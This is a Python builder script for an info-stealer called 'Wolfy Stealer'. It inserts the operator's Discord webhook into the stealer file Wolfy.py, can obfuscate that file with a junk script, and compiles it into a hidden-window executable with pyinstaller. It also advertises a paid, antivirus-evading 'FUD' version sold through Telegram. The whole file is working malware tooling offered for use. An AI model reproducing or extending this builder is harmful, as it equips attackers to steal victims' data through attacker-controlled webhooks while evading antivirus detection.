from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

██╗    ██╗ ██████╗ ██╗     ███████╗██╗   ██╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
██║    ██║██╔═══██╗██║     ██╔════╝╚██╗ ██╔╝    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
██║ █╗ ██║██║   ██║██║     █████╗   ╚████╔╝     ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
██║███╗██║██║   ██║██║     ██╔══╝    ╚██╔╝      ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝╚██████╔╝███████╗██║        ██║       ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝       ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                            Developed by @ZelvaFrancek420

                > Press ENTER to continue                                       

"""

Anime.Fade(Center.Center(intro),
           Colors.black_to_red,
           Colorate.Vertical,
           interval=0.035,
           enter=True)

print(f"""{Fore.LIGHTRED_EX}

██╗    ██╗ ██████╗ ██╗     ███████╗██╗   ██╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
██║    ██║██╔═══██╗██║     ██╔════╝╚██╗ ██╔╝    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
██║ █╗ ██║██║   ██║██║     █████╗   ╚████╔╝     ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
██║███╗██║██║   ██║██║     ██╔══╝    ╚██╔╝      ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝╚██████╔╝███████╗██║        ██║       ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝       ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                            Developed by @ZelvaFrancek420
                                                                            
           > Welcome to Wolfy Stealer builder 

""")

time.sleep(1)

while True:

  Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
  Write.Print("\n1. Build Exe", Colors.red_to_yellow)
  Write.Print("\n2. Build FUD Exe (Undetected by antivirus programs)",
              Colors.red_to_yellow)
  Write.Print("\n3. Close", Colors.red_to_yellow)
  Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
  choice = input()

  if choice == "1":
    os.system("cls || clear")
    webhook = input(Fore.CYAN + "\nEnter Your Discord Server Webhook: " +
                    Style.RESET_ALL)

    filename = "Wolfy.py"
    filepath = os.path.join(os.getcwd(), filename)
    with open(filepath, "r", encoding="utf-8") as f:
      content = f.read()
    new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
    with open(filepath, "w", encoding="utf-8") as f:
      f.write(new_content)
    Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

    obfuscate = False
    while True:
      answer = input(
        Fore.CYAN +
        "\nDo you want to junk your code? (NOT Recommended) (Y/N) " +
        Style.RESET_ALL)
      if answer.upper() == "Y":
        os.system("python junk.py")
        Write.Print(f"\n{filename} The file has been junked.",
                    Colors.red_to_yellow)
        break
      elif answer.upper() == "N":
        break
      else:
        Write.Print("\nYou have entered invalid. Please try again.",
                    Colors.red_to_purple)

    while True:
      answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " +
                     Style.RESET_ALL)
      if answer.upper() == "Y":
        if not obfuscate:
          cmd = f"pyinstaller --onefile --windowed {filename}"
        else:
          cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
        subprocess.call(cmd, shell=True)
        Write.Print(f"\n{filename} The file has been converted to exe.",
                    Colors.red_to_yellow)
        break
      elif answer.upper() == "N":
        break
      else:
        Write.Print("\nYou have entered invalid. Please try again.",
                    Colors.red_to_purple)

  elif choice == "2":
    Write.Print(
      "\nSorry, our fud exe version is ONLY availible in PRO version. If you want to purchase PRO version for 69$ please contact us on Telegram: https://t.me/ZelvaFrancek420",
      Colors.red_to_yellow)

  elif choice == "3":
    Write.Print("\nExiting the program...", Colors.red_to_yellow)
    break

  else:
    Write.Print("\nYou have entered invalid. Please try again.",
                Colors.red_to_purple)
